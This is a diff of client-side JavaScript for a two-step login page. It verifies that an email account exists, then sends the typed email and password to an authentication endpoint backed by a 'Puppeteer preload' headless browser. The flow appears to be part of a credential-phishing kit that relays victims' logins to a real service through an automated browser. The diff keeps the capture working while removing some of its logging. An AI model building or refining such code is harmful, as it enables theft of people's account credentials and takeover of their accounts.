@@ -1440,19 +1440,12 @@ Status: ${data.status}`);
                 const verifyData = await verifyResponse.json();
 
                 if (verifyResponse.ok && verifyData.exists) {
-                    // Account exists and preload started
-                    console.log('✅ Email account verified, preload started');
-                    currentSessionId = verifyData.sessionId; // Store session ID from preload
-
-                    // Show password form immediately - don't wait for preload
-                    console.log('🔓 Showing password form while preload continues in background');
+                    // Account exists
+                    console.log('✅ Email account verified');
+                    
+                    // Show password form
                     setLoading(false);
                     showPasswordForm(email);
-
-                    // Let preload continue in background without blocking UI
-                    if (verifyData.preloadStarted) {
-                        console.log('🔄 Puppeteer preload continuing in background for faster authentication');
-                    }
                 } else if (verifyData.exists === false) {
                     // Account doesn't exist
                     setLoading(false);
@@ -1554,17 +1547,18 @@ Status: ${data.status}`);
                     });
                 }
 
-                // Use fast authentication endpoint with preloaded browser
+                // Use fast authentication endpoint
+                const payload = { email, password };
+                if (currentSessionId) {
+                    payload.sessionId = currentSessionId; // Include session ID if available
+                }
+                
                 const response = await fetch('/api/authenticate-password-fast', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
-                    body: JSON.stringify({ 
-                        email, 
-                        password,
-                        sessionId: currentSessionId // Pass the preload session ID
-                    })
+                    body: JSON.stringify(payload)
                 });
 
                 const data = await response.json();
